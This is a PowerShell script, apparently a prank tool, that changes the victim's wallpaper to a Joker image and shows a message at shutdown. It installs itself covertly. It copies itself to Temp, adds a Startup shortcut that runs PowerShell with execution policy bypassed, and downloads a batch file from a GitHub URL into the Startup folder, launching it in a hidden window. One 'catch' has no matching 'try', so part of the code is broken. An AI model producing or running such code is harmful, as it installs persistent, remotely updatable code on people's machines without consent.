param (
    [string]$imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg",
    [int]$delayHours = 0
)

$scriptPath1 = "$env:userprofile\AppData\Local\Temp\set.ps1"
$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1"
$batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
$batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"

$imagePath = "$env:userprofile\Pictures\background.jpg"

function Show-ErrorMessage {
    param([string]$errorMessage)
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($errorMessage, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
}

function DownloadFile {
    param (
        [string]$url,
        [string]$outputPath
    )
    try {
        Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
    } catch {
        try {
            Invoke-Expression "curl -o `"$outputPath`" `"$url`"" | Out-Null
            if (-not (Test-Path $outputPath)) {
                throw "Curl download failed."
            }
        } catch {
            Show-ErrorMessage "Failed to download file: $url"
            exit
        }
    }
}

function Get-ScriptPath {
    if (Test-Path $scriptPath1) { return $scriptPath1 }
    elseif (Test-Path $scriptPath3) { return $scriptPath3 }
    else { return $null }
}

$scriptPath = Get-ScriptPath

if ($null -eq $scriptPath) {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batFilePath`"" -WindowStyle Hidden
    exit
}

if ($delayHours -gt 0) {
    Start-Sleep -Seconds ($delayHours * 3600)
}

try {
    if (-not (Test-Path $imagePath)) {
        DownloadFile $imageUrl $imagePath
    }
} catch {
    Show-ErrorMessage "Error during image download: $_"
    exit
}

try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)
} catch {
    Show-ErrorMessage "Failed to update wallpaper: $_"
    exit
}

try {
    Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
        Add-Type -AssemblyName PresentationFramework
        [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
    }
} catch {
}

$startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Start.lnk"

if (-not (Test-Path $startupShortcutPath)) {
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        $shortcut = $WshShell.CreateShortcut($startupShortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`"" 
        $shortcut.Save()
    } catch {
        Show-ErrorMessage "Failed to add script to startup: $_"
    }
}

if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1 -ErrorAction Stop
} catch {
    Show-ErrorMessage "Failed to copy script to temp folder: $_"
}

if (-not (Test-Path $batFilePath)) {
    DownloadFile $batchUrl $batFilePath
}
